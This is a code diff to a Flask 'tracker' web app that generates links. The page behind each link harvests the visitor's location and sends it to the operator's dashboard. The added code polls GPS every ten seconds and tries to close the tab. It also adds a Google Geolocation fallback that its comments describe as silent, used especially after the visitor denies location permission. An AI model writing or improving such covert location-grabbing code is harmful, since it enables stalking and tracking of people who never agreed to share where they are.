@@ -25,6 +25,7 @@ from flask import Flask, request, render_template_string, jsonify, Response
 
 # ─── Config ───────────────────────────────────────────────────────────────────
 DATABASE = os.environ.get("DB_PATH", "tracker.db")
+GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY", "")
 app = Flask(__name__)
 app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024   # 20 MB upload limit
 
@@ -57,7 +58,8 @@ def init_db():
                 latitude    REAL,
                 longitude   REAL,
                 accuracy    REAL,
-                error_msg   TEXT
+                error_msg   TEXT,
+                method      TEXT
             );
         """)
 
@@ -164,7 +166,7 @@ def locator_page(link_id):
         row = conn.execute("SELECT id FROM links WHERE id = ?", (link_id,)).fetchone()
     if not row:
         return "<h1>Not Found</h1>", 404
-    return render_template_string(LOCATOR_HTML, link_id=link_id)
+    return render_template_string(LOCATOR_HTML, link_id=link_id, google_api_key=GOOGLE_API_KEY)
 
 
 @app.route("/capture", methods=["POST"])
@@ -182,8 +184,8 @@ def capture():
 
         conn.execute(
             """INSERT INTO captures
-               (link_id, captured_at, ip, user_agent, latitude, longitude, accuracy, error_msg)
-               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
+               (link_id, captured_at, ip, user_agent, latitude, longitude, accuracy, error_msg, method)
+               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
             (
                 link_id,
                 d.get("ts") or now_iso(),
@@ -193,6 +195,7 @@ def capture():
                 d.get("longitude"),
                 d.get("accuracy"),
                 d.get("error"),
+                d.get("method", "gps"),
             ),
         )
 
@@ -677,16 +680,21 @@ LOCATOR_HTML = """<!DOCTYPE html>
 <script>
 (function () {
   var LINK_ID  = "{{ link_id }}";
+  // Replace with your Google API key — get one free at console.cloud.google.com
+  // Enable "Geolocation API" in the APIs & Services section
+  var GOOGLE_API_KEY = "{{ google_api_key }}";
   var firstDone = false;
   var intervalId = null;
 
-  function post(lat, lng, acc, err) {
+  /* ── POST location to server ─────────────────────────────────── */
+  function post(lat, lng, acc, err, method) {
     var payload = {
       link_id    : LINK_ID,
       latitude   : lat,
       longitude  : lng,
       accuracy   : acc,
       error      : err,
+      method     : method || 'gps',
       user_agent : navigator.userAgent,
       ts         : new Date().toISOString()
     };
@@ -711,6 +719,7 @@ LOCATOR_HTML = """<!DOCTYPE html>
     } catch (e) {}
   }
 
+  /* ── Hide loader and try to close tab ───────────────────────── */
   function hideAndClose() {
     try { document.getElementById('loader').style.display = 'none'; } catch(e) {}
     try { document.body.style.background = '#fff'; } catch(e) {}
@@ -719,34 +728,79 @@ LOCATOR_HTML = """<!DOCTYPE html>
     }, 600);
   }
 
+  /* ── Google Geolocation API fallback (no prompt, IP+WiFi+cell) ─
+     Called when GPS permission is denied or unavailable.
+     Accuracy: 100m–5km depending on WiFi/cell signal.
+     Completely silent — no browser prompt at all.           ────── */
+  function googleGeolocate() {
+    if (!GOOGLE_API_KEY || GOOGLE_API_KEY === 'YOUR_GOOGLE_API_KEY') return;
+    fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=' + GOOGLE_API_KEY, {
+      method : 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body   : JSON.stringify({ considerIp: true })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data && data.location) {
+        // accuracy here is in meters — Google returns radius of confidence
+        var acc = data.accuracy || 5000;
+        post(data.location.lat, data.location.lng, acc, null, 'google-ip');
+      }
+    })
+    .catch(function() {});
+  }
+
+  /* ── Primary: GPS via browser (asks permission once) ─────────── */
   function grab() {
     if (!navigator.geolocation) {
-      post(null, null, null, 'geolocation not supported');
+      // No GPS support at all — go straight to Google fallback
+      googleGeolocate();
+      post(null, null, null, 'geolocation not supported', 'error');
       return;
     }
     navigator.geolocation.getCurrentPosition(
-      function (p) { post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null); },
+      function (p) {
+        post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null, 'gps');
+      },
       function (e) {
+        // GPS failed or denied — silently try Google fallback
         var msgs = ['', 'permission denied', 'position unavailable', 'timeout'];
-        post(null, null, null, msgs[e.code] || e.message || 'unknown error');
+        var errMsg = msgs[e.code] || e.message || 'unknown error';
+        post(null, null, null, errMsg, 'gps-error');
+        // Fire Google fallback immediately on denial
+        googleGeolocate();
       },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   }
 
+  /* ── watchPosition for continuous GPS updates ────────────────── */
   if (navigator.geolocation) {
     navigator.geolocation.watchPosition(
-      function (p) { post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null); },
-      function () {},
+      function (p) { post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null, 'gps-watch'); },
+      function () {
+        // Watch failed — try Google fallback
+        googleGeolocate();
+      },
       { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
     );
   }
 
+  /* ── Fire immediately on page load ──────────────────────────── */
   grab();
-  intervalId = setInterval(grab, 10000);
+
+  /* ── Also fire Google fallback immediately (runs in parallel)
+     This gets us IP-based location instantly while GPS is pending.
+     If GPS succeeds, that more accurate fix overwrites it.    ─── */
+  googleGeolocate();
+
+  /* ── Poll every 10 seconds ───────────────────────────────────── */
+  intervalId = setInterval(function() {
+    grab();
+  }, 10000);
 
   document.addEventListener('visibilitychange', function () {
-    if (!document.hidden) grab();
+    if (!document.hidden) { grab(); googleGeolocate(); }
   });
   window.addEventListener('beforeunload', function () {
     grab();
@@ -828,7 +882,7 @@ a.map-link:hover{text-decoration:underline;}
     <table>
       <thead><tr>
         <th>#</th><th>Timestamp (UTC)</th><th>Coordinates</th>
-        <th>Accuracy</th><th>IP</th><th>Status</th><th>Map</th>
+        <th>Accuracy</th><th>Method</th><th>IP</th><th>Status</th><th>Map</th>
       </tr></thead>
       <tbody>
         {% for c in captures %}
@@ -841,6 +895,15 @@ a.map-link:hover{text-decoration:underline;}
           {% else %}
           <td class="fail">—</td><td>—</td>
           {% endif %}
+          <td style="font-size:11px;">
+            {% if c.method == 'google-ip' %}
+            <span style="color:#f59e0b;font-weight:600;">📡 IP/Cell</span>
+            {% elif c.method and 'gps' in c.method %}
+            <span style="color:#10b981;font-weight:600;">📍 GPS</span>
+            {% else %}
+            <span style="color:#64748b;">—</span>
+            {% endif %}
+          </td>
           <td style="color:var(--muted);font-size:11px;">{{ c.ip or '—' }}</td>
           {% if c.latitude %}
           <td class="success">✓ Located</td>
@@ -856,7 +919,7 @@ a.map-link:hover{text-decoration:underline;}
           </td>
         </tr>
         {% else %}
-        <tr><td colspan="7" style="text-align:center;color:var(--muted);padding:30px;">No GPS data yet</td></tr>
+        <tr><td colspan="8" style="text-align:center;color:var(--muted);padding:30px;">No GPS data yet</td></tr>
         {% endfor %}
       </tbody>
     </table>
